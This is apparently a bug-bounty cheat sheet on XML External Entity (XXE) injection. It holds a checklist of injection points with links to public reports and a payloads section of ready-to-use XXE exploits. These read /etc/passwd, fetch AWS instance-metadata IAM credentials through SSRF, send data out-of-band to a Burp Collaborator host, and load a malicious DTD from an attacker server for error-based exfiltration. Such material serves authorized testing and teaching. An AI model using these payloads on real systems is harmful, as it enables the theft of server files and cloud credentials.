# XML External Enteties (XXE)

There are various types of XXE attacks: 
- Exploiting XXE to retrieve files, where an external entity is defined containing the contents of a file, and returned in the application's response.
- Exploiting XXE to perform SSRF attacks, where an external entity is defined based on a URL to a back-end system.
- Exploiting blind XXE exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls.
- Exploiting blind XXE to retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.


### Places to try to submit XML

- [ ] Submit XML requests where json is.
 - https://blog.netspi.com/playing-content-type-xxe-json-endpoints/
 - https://hackerone.com/reports/106797
- [ ] Change GET to POST and submit xml.
- https://hackerone.com/reports/154096
- [ ] Via SAML assertions.
- https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf & https://httpsonly.blogspot.se/2017/01/0day-writeup-xxe-in-ubercom.html
- [ ] In SOAP requests
- https://hackerone.com/reports/36450
- [ ] In SVG files.
 - http://esoln.net/Research/2017/03/30/xxe-in-lithium-community-platform/
 - https://0xatul.github.io/posts/2020/02/external-xml-entity-via-file-upload-svg/
- [ ] In PDF files
- [ ] In MS Office files, word, excel, ppt files. 
- https://hackerone.com/reports/105434
- https://hackerone.com/reports/334488
- [ ] Logins over xml
- https://hackerone.com/reports/105753
- https://hackerone.com/reports/105980

## Payloads

**Exploiting XXE to retrieve files, where an external entity is defined containing the contents of a file, and returned in the application's response.**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>1&xxe;</productId><storeId>1</storeId></stockCheck>
```

**Exploiting XXE to perform SSRF attacks, where an external entity is defined based on a URL to a back-end system.**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/">
]><stockCheck><productId>2&xxe;</productId><storeId>1</storeId></stockCheck>
```

**Exploiting blind XXE exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls.**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://devpey9157asm7owheb6tcwh58byzn.burpcollaborator.net">
]><stockCheck><productId>2&xxe;</productId><storeId>1</storeId></stockCheck>
```

**Exploiting blind XXE to retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.**

Host the following malicious dtd on the attack server:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error; 
```

Invoke the malicious dtd:

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://attacker-server"> %xxe;]><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```

